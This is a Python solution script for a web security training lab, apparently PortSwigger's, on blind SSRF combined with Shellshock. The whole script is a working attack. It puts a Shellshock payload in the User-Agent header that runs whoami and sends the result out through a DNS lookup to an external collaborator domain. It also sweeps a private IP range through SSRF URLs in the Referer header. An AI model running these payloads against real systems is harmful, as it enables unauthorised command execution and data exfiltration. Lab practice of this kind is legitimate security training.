###############################################################################
#
# Lab: Blind SSRF with Shellshock exploitation
#
# Hack Steps:
#      1. Inject shellshock payload into the User-Agent header to exfiltrate
#         the OS user via DNS lookup
#      2. Inject SSRF payload into the Referer header to iterate over
#         all private IPs
#      3. Check your burp collaborator for the OS user in the DNS lookup
#      4. Submit the solution
#
###############################################################################
import requests
from colorama import Fore


# Change this to your lab URL
LAB_URL = "https://0a8d0010036565e5810b4db5009e003a.web-security-academy.net" 

# Change this to your collaborator domain
BURP_COLLABORATOR = "hpa7bodagd7g3i4gxe0yo3z68xeo2gq5.oastify.com"

def main():
    print("‚¶ó#‚¶ò Injection point: " + Fore.YELLOW + "User Agent & Referer headers")

    shellshock_payload = f"() {{ 42;}};echo;/bin/nslookup $(/bin/whoami).{BURP_COLLABORATOR}"

    for x in range(0,255):
        payload = f"http://192.168.0.{x}:8080"
        
        print(Fore.WHITE + "‚ùØ‚ùØ Injecting shellshock payload with SSRF to all private IPs (" + Fore.YELLOW + payload + Fore.WHITE + ").. ", end="\r", flush=True)
        
        headers = { "User-Agent": shellshock_payload, "Referer": payload }

        try:
            requests.get(f"{LAB_URL}/product?productId=1", headers=headers)

        except:
            print(Fore.RED + "‚¶ó!‚¶ò Failed to fetch the page with the injected payload through exception")

    
    print(Fore.WHITE + "\nüóπ Check your burp collaborator for the OS user in the DNS lookup then submit the solution")

if __name__ == "__main__":
    main()